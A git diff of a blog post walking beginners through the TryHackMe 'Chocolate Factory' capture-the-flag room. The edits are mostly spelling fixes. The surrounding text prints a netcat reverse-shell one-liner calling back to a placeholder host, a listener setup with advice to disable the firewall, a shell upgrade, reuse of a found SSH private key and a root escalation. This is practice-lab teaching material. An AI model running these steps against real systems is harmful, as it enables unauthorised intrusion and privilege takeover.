@@ -7,10 +7,8 @@ img: titlephoto1.jpg # Add image post (optional)
 tags: [Tryhackme, CTF] # add tag
 ---
 
-Today’s blog post — I will give a walk-through on room called, “Chocolate Factory”. This is perfect practice for Beginners 
-
-Let’s get started.
-Firstly Diploy the machine and Wait a minute for get ip address to start.
+Today’s blog post — I will give a walk-through on room called, “Chocolate Factory”. This is perfect practice for Beginners. 
+Let’s get started. Firstly Deploy the machine and wait a minute for getting the IP address to start.
 
 ![init]({{site.baseurl}}/assets/img/cholocate.tryhackme/init.png)
 
@@ -28,11 +26,11 @@ the result like look,<br />
   ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/init1.png)
    
 
-There can see ftp running on port 21,ssh running on port 22 and webserver in port 80 Then try Open browser enter ip address default webserver running in port 80 
+There can see FTP running on port 21, ssh running on port 22, and webserver in port 80 Then try Open browser enter IP address default web server running in port 80 
   
   ![nmap]({{site.baseurl}}/assets/img/cholocate.tryhackme/init2.png)
 
-I trying sqlinjection but nothing changes ,So Check the directories using gobuster 
+I trying SQL injection but nothing changes, So Check the directories using the gobuster tool.
 
     gobuser dir -u <ip> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
   
@@ -42,8 +40,7 @@ OK.. Here see home.php <br />
   
      'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f'
  
- remember one thing  disable your ufw firewall before run the listerning netcat <br />
-  listerning  our system 
+  Remember one thing disable your ufw firewall before running the listening netcat. <br />
   
      nc -lvnp <port> 
     -l listen mode, for inbound connects 
@@ -57,7 +54,7 @@ OK.. Here see home.php <br />
       
       python3 -c 'import pty; pty.spawn("/bin/sh")' 
       
-   then list out file and read key
+   then list out the file and read the file..
    
    ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/cat.key.png)
   
@@ -67,7 +64,7 @@ OK.. Here see home.php <br />
    
    change the user to charlie <br/>
    /home/charlie and list all files <br />
-   found RSA key in this folder called teleport and I copied it to my machine and saved that under the name id_rsa.change permission
+   found RSA key in this folder called teleport and I copied it to my machine and saved that under the name id_rsa.change the permission.
    
    ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/id_rsa.png) <br />
    
@@ -93,14 +90,14 @@ OK.. Here see home.php <br />
    
    ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/gtbl.png) <br />
    ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/root.png) <br />
-   copy the command and paste into terminal and hit enter <br />
+   copy the command and paste into the terminal and hit enter <br />
    Now root user <br >
    change charlie to root <br />
    
     su root
    
    
-   list the files and run python file ,enter the key 
+   list the files and run python file, enter the key 
    ![success]({{site.baseurl}}/assets/img/cholocate.tryhackme/root3.png) <br />
    DONE !!!
   
